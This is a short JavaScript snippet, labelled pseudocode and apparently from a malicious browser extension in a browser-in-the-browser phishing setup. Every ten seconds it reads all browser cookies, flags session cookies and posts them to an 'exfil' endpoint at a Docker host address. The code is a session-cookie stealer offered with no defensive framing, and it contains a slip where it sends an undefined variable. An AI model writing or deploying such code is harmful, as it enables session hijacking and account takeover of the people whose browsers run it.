// Pseudocode of the core extraction loop
setInterval(async () => {
  const allCookies = await browser.cookies.getAll({});
  
  // Organize by domain, flag priority cookies
  const priority = {};
  for (cookie of allCookies) {
    if (isSessionCookie(cookie.name)) {
      priority[cookie.domain + "::" + cookie.name] = cookie;
    }
  }
  
  // POST to BitB exfil endpoint
  await fetch("http://host.docker.internal:8080/api/ext/exfil", {
    method: "POST",
    body: JSON.stringify({ type: "cookies", data: { all, priority } })
  });
}, 10000); // Every 10 seconds
